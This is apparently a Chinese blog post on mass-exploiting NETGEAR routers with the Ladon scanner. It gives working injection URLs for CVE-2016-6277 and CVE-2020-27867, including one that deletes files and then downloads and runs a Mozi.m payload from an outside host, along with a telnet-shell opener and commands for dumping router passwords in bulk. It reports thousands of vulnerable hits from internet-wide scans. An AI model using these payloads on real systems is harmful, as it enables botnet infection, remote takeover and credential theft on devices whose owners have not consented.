> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gSdTsn1rcoTXNGRn5b0Byw)

,![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaiaAOj7ZRlousSNyiaNqlwjExYJjZb9ibV1vxziaDjnEFs1XUpXMv9sYVtw/640?wx_fmt=png)

NETGEAR 是美国网件公司的路由器。  

美国网件公司简介：NETGEAR 美国网件，为全球商用企业用户和家庭个人用户提供创新的产品、优质的智能家庭无线解决方案。始终以提升用户体验为己任，采用业界前沿技术，凭借独特工业设计和专利无线技术，以其稳定性高、速度快、性能彪悍，屡获德国红点设计大奖、美国 CES 科技创新奖、欧洲电脑协会（EHA）奖。NETGEAR 推出全球首款基于 802.11n 无线协议标准的产品，以三层千兆以太网交换机刷新了全世界最智能的三层千兆交换机性能表现。

WhatCMS 指纹别网络设备 路由器

```
Ladon48 ip/24 WhatCMS  扫描C段常见Web端口资产并识别CMS
Ladon48 ip/c WhatCMS  扫描C段
Ladon48 ip/b WhatCMS  扫描B段
Ladon48 ip/a WhatCMS  扫描A段
Ladon48 url.txt WhatCMS  批量url
Ladon48 ip24.txt WhatCMS  多个C段放在txt里
Ladon48 ip16.txt WhatCMS  多个B段放在txt里
```

不管我们正在做内网渗透还是外网渗透，对于非域或没有 0day 一键拿权限的情况下，资产探测并识别指纹是非常重要的，知道目标使用什么设备才能定制 POC，知道目标使用什么 CMS 才能针对性查找 POC 或定制相应工具，对于 Web 资产，提交参数为 IP 时 (包含 C 段、B 段、A 段等)，WhatCMS 模块将自动探测常见 Web 端口资产，同时识别 CMS，为后续渗透提供基础。如本文假设探测到 netgear 路由器  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4CN0vg25BiaeFfP8EE6G0OFNDKjYmx2WJGlEq0N8E4GqtHdALvDu0TlTZvW8YAh7MkicxfBIXN8dOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4CN0vg25BiaeFfP8EE6G0OFNDKjYmx2WJGlEq0N8E4GqtHdALvDu0TlTZvW8YAh7MkicxfBIXN8dOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**一、Netgear R7000 RCE cve-2016-6277  
**

虽然漏洞很旧，快 7 年了，但硬件这种东西，很多人不会去升级，特别是家用的，换个角度，做安全的家里的路由器都不一定更新固件，不懂技术的普通人怎么可能更新，除非路由器自带更新功能，近几年的型号可能有，但是早期的多数不含自动更新固件功能，所以没有专人维护的设备，就是突破口。

```
url: http://:8443/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;
${IFS}wget${IFS}http://k8gege.org:800/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m
```

因为是无回显漏洞，所以我们需要在 VPS 上启动 Ladon web 800 命令监听，用于捕获存在漏洞的 IP，旧版 Ladon 需重定向输出到 txt 才能获取漏洞结果。最新版 10.6.1 自动保存提交 ISVUL 或 POCTEST 字符串的 IP 到 isvul.txt 中。  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaZeRz08gF00hYQ6vxOZwwMZZCPERibW6UvUPN8MdCNOhDMyhkbbNqvow/640?wx_fmt=png)

使用 LadonExp 可一键生成 POC，快速扩展 Ladon 的批量扫描能力

```
/cgi-bin/;wget${IFS}http://You_VPS_IP:800/ISVUL;
```

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiasc82ZPg0efDQnLM1KvHINicvNO77G5gqyzgn4OxZwFA22Cib5Iia4gtyQ/640?wx_fmt=png)

点击 Build DLL 生成 poc.dll，点击 Test DLL, 自动调用 Ladon 测试 POC 是否可用  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiangc4p1KMCRe4fHB0MLlvCKFrf0db8mXrnIVUDrw9uM0eK8qyMUgJicw/640?wx_fmt=png)

目标存在漏洞，将会执行 wget 命令访问 Ladon 的 web 服务器，可以看到，存在漏洞的路由器 Wget 版本基本为 Wget/1.17.1 （Linux-gnu）。高亮黄色为目标 IP，最新版存在漏洞将显示高亮紫色，且自动保存漏洞 IP。

单个 URL 测试成功后，可使用以下命令，批量检测存在漏洞路由器  

```
Ladon48 url.txt LadonPoc48.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaAxibicQ14EzDria31QI9yiacPPVMwSHOfwMX1keibPiaIn9unHFFwic3WmYXQ/640?wx_fmt=png)

**开启 Telnet Shell  
**

按照以上操作，我们也可以批量获取路由器 Telnet 权限，Poc 如下

```
http://RouterIP/;telnetd$IFS-p$IFS'888'
```

**二、CVE-2020-27867 RCE**  

```
http://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20k8gege.org
```

大家参考第一个漏洞，自行复现此漏洞, 加深印象

**三、NetGear 路由器密码读取**  

github 上的一个 py 脚本，通过 INI 配置，也可以快速扩展 Ladon 扫描能力  

poc.ini  

```
[Ladon]
exe=python.exe
arg=longue-vue.py --target $ip$ --dump-pwd
```

**批量检测**

```
Ladon url.txt poc.ini
```

测试几千个 IP，发现仅得到几十个结果，这和文章第一个漏洞所说，很多人不更新有点不符啊。于是使用 Firefox 和 Chrome 访问，很多都访问不到，特别是有一些是 Ladon 密码审计出来的也识别出了版本，显然目标是可以访问的。原来 tls 版本的原因，看来 PY 脚本可能也是这问题  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaQWyKic41q0MEUHo9jHqJQkT7qDSxFt4jLAzwoJKyatHDRng2UK3Wx7g/640?wx_fmt=png)

使用 IE 成功访问，这和 Ladon 探测或 401 密码审计弱口令一致  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWia3hExRCRJthqkjw8LGLmvrWwfceVTJoIDWrNE95WFYCN9Df6Hyut17w/640?wx_fmt=png)

使用 LadonEXP 测试，可访问到该路由器，完美回显 html 源码  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaPfKicA6dUUSdSXxgYBtBnYjCzdcnAkyib0rapnqLpAGzaZBicIl44C1Zw/640?wx_fmt=png)

于是提取 PY 里的核心 POC，通过 LadonEXP 发包，发现回显中返回密码。为什么这么做，因为改别人的代码，还不如自己写，加上有现成的，只需配置就可以生成，为什么用 Python 这种 SB 缩进让人蛋疼的语言，加上 Ladon 调用外部非. net 程序，无法完美兼容。  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiah8oGzrWicIhUu9gHQic7zHOxT6659bS701MvI9mV2Lclwc6rBCWklicaw/640?wx_fmt=png)

使用正则提取密码  

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaoR2FlywkcSz2LuVc4R1JicfL5dadaJibW0UyQ4pSgHWhzA4pLNhb9MUA/640?wx_fmt=png)

**Ladon 模块 NetGearPwd  NetGear 路由器密码读取**

```
##### 194 NetGearPwd NetGear DGND3700v2路由器密码读取
Ladon https://192.168.1.8 NetGearPwd
Ladon url.txt NetGearPwd 批量NetGear漏洞导出用户密码
```

![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW7OU50g7M5ug6J05QlqBRWiaKR1Uzy8CczWmcYmG6eaCgiaQSNiapykyibLcKELjKiaT8OVSgxGicA0Q6GQ/640?wx_fmt=png)

果然同样的 Payload 改用 Ladon 来提交，得到了几千结果。测试发现，使用读取出来的密码，也有登陆不了的，和之前发的 401 密码审计 NetGear 路由器得出的密码一样，最初以为是误报，现在猜测可能是类似 RouterOS 路由器，做了 IP 限制等原因导致有正确密码也无法登陆。问我怎么办？试其它可以登陆的啊，不是一堆存在漏洞吗。

**四、NetGear 密码审计**

该路由器默认密码 admin 1234 等，可参考 10.5 发的文章  
  

[Ladon 10.5 多款路由器弱口令检测](http://mp.weixin.qq.com/s?__biz=Mzg3MTY4NjUyOQ==&mid=2247484855&idx=1&sn=536c188c5d0d16b77570971b64874853&chksm=cefb8d59f98c044fce9e25f9e49fce354f1f662b3ff82ceee808d78197fb3aa5b7c545fecdba&scene=21#wechat_redirect)  

**五、小结**

实战同一个漏洞甚至同一个 POC，可以尝试不同工具提交，可能会有不同结果。就像本文 github 上找的 py 脚本，若是单纯拿它来打，可能就真的以为只有几十个 IP 有洞了，有超时的原因，也有 SSL 版本的原因，但大部份 POC 只是 POC，只是用来单纯证明存在漏洞。可能测试时只针对 HTTP，没有针对 HTTPS，即使针对 HTTPS，1.0 1.1 1.2 1.3 等也有很多区别。在过往文章中我也多次提到针对 URL 的，优先使用 Ladon48，因为它可兼容多个 SSL 版本。其它语言也是同理，除非作者处理了所有， 要不然就会导致错过很多本就存在漏洞的站点。tls 1.2 不只是在这款路由，在其它路由我也遇到了，还有某些 Excahnge 或其它站点，基本上遇到 1.2 和 1.3 的网上很多 POC 可能会失效。所以实战中可能需要使用不同工具，Ladon 不同版本针对 SSL 也有很大区别。  

本文中的一个 RCE，在漂亮一个都扫不到，很明显这不是漏洞，而是人为后门。显而易见，硬件供应链攻击在多国中，早已存在多年，特别是上次黑帽大会提到的 Cisco 供应链攻击，研究人员在 PDF 明确提到修改思科再出售，后续可通过该型号思科横向获取管理员权限。我怀疑这个研究人员发现可以修改固件，实际上可能也是别人故意留的后门之一，只是没有那么明显，因为留后门人的能力也分三六九等，渗透也分三六九等，任何技术都一样，有人留后门一言就看出是后门，或者容易被人挖到然后公开所谓的 RCE 漏洞，又或者公开了被轻易利用，但是牛 B 的难度大的，即便公开了也有漏洞细节了，全球都没几个人能复现。当然也有可能那个真的是研发人员安全意识不够，不懂安全导致的，因为对于不懂渗透的，研发的东西确实不考虑安全，并不知危害。现实中 99.999% 的漏洞是真的漏洞，剩下的所谓漏洞，肯定是人为留下的，实是被人发现了不能承认是后门，只能修补。